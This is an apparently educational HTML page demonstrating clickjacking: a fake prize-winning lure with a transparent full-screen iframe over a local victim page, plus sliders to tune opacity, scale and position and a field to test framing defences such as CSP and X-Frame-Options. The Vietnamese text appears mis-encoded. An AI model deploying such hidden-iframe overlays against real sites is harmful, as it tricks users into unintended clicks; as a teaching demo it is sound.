<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>ğŸ QUAY Sá» TRÃšNG THÆ¯á»NG - 100 TRIá»†U Äá»’NG</title>
    <style>
        /* CSS giá»¯ nguyÃªn, chá»‰ thÃªm padding-top Ä‘á»ƒ nÃºt khÃ´ng sÃ¡t cáº¡nh */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%); min-height: 100vh; overflow: hidden; padding-top: 50px; /* ThÃªm padding cho dá»… cÄƒn chá»‰nh */ } 
        .attacker-page { position: relative; width: 100%; height: 100vh; display: flex; flex-direction: column; justify-content: flex-start; /* Thay Ä‘á»•i Ä‘á»ƒ cÄƒn chá»‰nh tá»‘t hÆ¡n */ align-items: center; z-index: 1; } 
        .title { font-size: 48px; font-weight: bold; color: white; text-shadow: 3px 3px 6px rgba(0,0,0,0.3); margin-bottom: 20px; animation: pulse 2s infinite; text-align: center; } 
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } } 
        .subtitle { font-size: 24px; color: white; margin-bottom: 40px; text-align: center; } 
        .prize-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; position: relative; z-index: 2; } 
        .prize-amount { font-size: 64px; font-weight: bold; color: #ff6b6b; margin-bottom: 20px; } 
        .prize-text { font-size: 20px; color: #666; margin-bottom: 30px; } 
        .spin-button { padding: 20px 60px; font-size: 24px; font-weight: bold; background: linear-gradient(135deg, #ff6b6b 0%, #ff5252 100%); color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4); transition: all 0.3s; position: relative; z-index: 3; } 
        .spin-button:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6); } 
        .spin-button:active { transform: translateY(0); } 
        
        /* IFRAME OVERLAY - ÄÃ£ sá»­a */
        .iframe-overlay {
            position: fixed;
            top: 50%; /* Báº¯t Ä‘áº§u cÄƒn giá»¯a trang */
            left: 50%;
            width: 100%;
            height: 100%;
            opacity: 0.0; /* Trong suá»‘t hoÃ n toÃ n */
            z-index: 9999; /* Náº±m trÃªn cÃ¹ng */
            pointer-events: auto;
            display: none; /* áº¨n máº·c Ä‘á»‹nh */
            transform: translate(-50%, -50%); /* Dá»‹ch chuyá»ƒn Ä‘á»ƒ cÄƒn giá»¯a */
        }
        
        .iframe-overlay.active {
            display: block;
        }
        
        .victim-iframe {
            width: 100%;
            height: 100%;
            border: none;
            /* Scale vÃ  Position sáº½ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng JS */
            transform: scale(1.2) translateY(0px); 
            transform-origin: center center;
        }
        
        /* Controls vÃ  Warning banner giá»¯ nguyÃªn */
        .controls { position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.8); padding: 20px; border-radius: 10px; color: white; z-index: 10000; } 
        .controls h3 { margin-bottom: 15px; color: #feca57; } 
        .control-btn { display: block; width: 100%; padding: 10px; margin: 5px 0; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; } 
        .control-btn:hover { background: #764ba2; } 
        .control-btn.danger { background: #e74c3c; } 
        .control-btn.danger:hover { background: #c0392b; } 
        .slider-group { margin: 10px 0; } 
        .slider-group label { display: block; margin-bottom: 5px; font-size: 12px; } 
        .slider-group input { width: 100%; } 
        .info-box { background: rgba(255, 255, 255, 0.1); padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 12px; border: 1px solid rgba(255, 255, 255, 0.2); } 
        .warning-banner { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(231, 76, 60, 0.95); color: white; padding: 15px 30px; border-radius: 10px; font-weight: bold; z-index: 10001; box-shadow: 0 5px 20px rgba(0,0,0,0.3); } 
        .confetti { position: fixed; width: 10px; height: 10px; background: #feca57; animation: fall 3s linear infinite; } 
        @keyframes fall { to { transform: translateY(100vh) rotate(360deg); } } 
    </style>
</head>
<body>
    <div class="attacker-page">
        <h1 class="title">ğŸ CHÃšC Má»ªNG! ğŸ</h1>
        <p class="subtitle">Báº¡n Ä‘Ã£ trÃºng thÆ°á»Ÿng chÆ°Æ¡ng trÃ¬nh khuyáº¿n mÃ£i Ä‘áº·c biá»‡t!</p>
        
        <div class="prize-box">
            <div class="prize-amount">100,000,000â‚«</div>
            <p class="prize-text">Nháº¥n nÃºt bÃªn dÆ°á»›i Ä‘á»ƒ nháº­n thÆ°á»Ÿng ngay!</p>
            <button class="spin-button" id="claimButton">ğŸ‰ NHáº¬N THÆ¯á»NG NGAY ğŸ‰</button>
        </div>
    </div>
    
    <div class="iframe-overlay" id="iframeOverlay">
        <iframe 
            id="victimFrame"
            class="victim-iframe"
            src=""
            sandbox="allow-same-origin allow-scripts allow-forms" 
            title="Hidden Frame">    
        </iframe>
    </div>
    
    <div class="controls">
        <h3>âš™ï¸ Äiá»u khiá»ƒn Demo</h3>
        
        <button class="control-btn danger" onclick="activateAttack()">
            ğŸ¯ KÃCH HOáº T Táº¤N CÃ”NG
        </button>
        
        <button class="control-btn" onclick="deactivateAttack()">
            ğŸ›‘ Táº®T Táº¤N CÃ”NG
        </button>
        
        <div class="slider-group">
            <label for="protectionInput">Cháº¿ Ä‘á»™ báº£o vá»‡ Victim (none, xframe, csp, framebuster, sameorigin):</label>
            <input type="text" id="protectionInput" value="none" placeholder="none, csp, xframe...">
        </div>
        <div class="slider-group">
            <label>Äá»™ trong suá»‘t iframe: <span id="opacityValue">0%</span></label>
            <input type="range" min="0" max="100" value="0" id="opacitySlider" oninput="adjustOpacity(this.value)">
        </div>
        
        <div class="slider-group">
            <label>Scale iframe: <span id="scaleValue">1.2x</span></label>
            <input type="range" min="50" max="200" value="120" id="scaleSlider" oninput="adjustScale(this.value)">
        </div>
        
        <div class="slider-group">
            <label>Vá»‹ trÃ­ Y: <span id="posYValue">0px</span></label>
            <input type="range" min="-500" max="500" value="0" id="posYSlider" oninput="adjustPosition(this.value)">
        </div>
        
        <div class="info-box">
            <strong>ğŸ“Œ HÆ°á»›ng dáº«n:</strong><br>
            1. Äáº·t cháº¿ Ä‘á»™ báº£o vá»‡ muá»‘n kiá»ƒm tra (vÃ­ dá»¥: **csp**).<br>
            2. Nháº¥n "KÃ­ch hoáº¡t táº¥n cÃ´ng".<br>
            3. Náº¿u bá»‹ cháº·n, báº¡n sáº½ tháº¥y lá»—i trong Console. Náº¿u khÃ´ng bá»‹ cháº·n, cÄƒn chá»‰nh vÃ  giáº£m opacity vá» 0% Ä‘á»ƒ thá»­ click.
        </div>
    </div>
    
    <div class="warning-banner">
        âš ï¸ ÄÃ‚Y LÃ€ DEMO GIÃO Dá»¤C - KHÃ”NG Sá»¬ Dá»¤NG VÃ€O Má»¤C ÄÃCH Xáº¤U
    </div>
    
    <script>
        let attackActive = false;
        
        function activateAttack() {
            attackActive = true;
            const overlay = document.getElementById('iframeOverlay');
            const iframe = document.getElementById('victimFrame');
            
            // Láº¥y cháº¿ Ä‘á»™ báº£o vá»‡ tá»« Ã´ input
            const protectionMode = document.getElementById('protectionInput').value.toLowerCase() || 'none';
            
            // Äáº·t láº¡i src Ä‘á»ƒ yÃªu cáº§u server gá»­i header má»›i
            iframe.src = `/victim.html?protection=${protectionMode}`; 

            overlay.classList.add('active');
            
            alert('âš ï¸ Táº¤N CÃ”NG ÄÃƒ KÃCH HOáº T!\n' +
                  `Äang táº£i Victim vá»›i cháº¿ Ä‘á»™: ${protectionMode.toUpperCase()}\n\n` +
                  'Kiá»ƒm tra Console Ä‘á»ƒ xem trÃ¬nh duyá»‡t cÃ³ cháº·n iframe báº±ng Header khÃ´ng.');
        }
        
        function deactivateAttack() {
            attackActive = false;
            const overlay = document.getElementById('iframeOverlay');
            overlay.classList.remove('active');
            document.getElementById('opacitySlider').value = 0;
            document.getElementById('opacityValue').textContent = '0%';
        }
        
        function adjustOpacity(value) {
            const overlay = document.getElementById('iframeOverlay');
            overlay.style.opacity = value / 100;
            document.getElementById('opacityValue').textContent = value + '%';
        }
        
        function adjustScale(value) {
            const iframe = document.getElementById('victimFrame');
            // Láº¥y vá»‹ trÃ­ Y hiá»‡n táº¡i Ä‘á»ƒ khÃ´ng ghi Ä‘Ã¨
            const currentTransform = iframe.style.transform;
            const posY = currentTransform.match(/translateY\(([^)]+)\)/)?.[1] || '0px'; 
            
            iframe.style.transform = `scale(${value / 100}) translateY(${posY})`;
            document.getElementById('scaleValue').textContent = (value / 100).toFixed(2) + 'x';
        }
        
        function adjustPosition(value) {
            const iframe = document.getElementById('victimFrame');
            // Láº¥y scale hiá»‡n táº¡i
            const currentTransform = iframe.style.transform;
            const scale = currentTransform.match(/scale\(([\d.]+)\)/)?.[1] || 1.2;
            
            iframe.style.transform = `scale(${scale}) translateY(${value}px)`;
            document.getElementById('posYValue').textContent = value + 'px';
        }
        
        // Hiá»‡u á»©ng confetti vÃ  cÃ¡c hÃ m khÃ¡c (Giá»¯ nguyÃªn)
        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3'][Math.floor(Math.random() * 4)];
            confetti.style.animationDelay = Math.random() * 3 + 's';
            document.body.appendChild(confetti);
            
            setTimeout(() => confetti.remove(), 3000);
        }
        
        setInterval(createConfetti, 300);
        
        document.getElementById('claimButton').addEventListener('click', function() {
            if (!attackActive) {
                alert('ğŸ‰ Cáº£m Æ¡n báº¡n Ä‘Ã£ tham gia!\n\nÄÃ¢y chá»‰ lÃ  trang demo giÃ¡o dá»¥c vá» Clickjacking.');
            }
            // Náº¿u attackActive=true, click sáº½ trÆ°á»£t vÃ o iframe áº©n.
        });
        
        document.getElementById('victimFrame').addEventListener('load', function() {
            console.log('Iframe finished attempting to load. Check console for "Refused to display..." error if protection is ON.');
        });
    </script>
</body>
</html>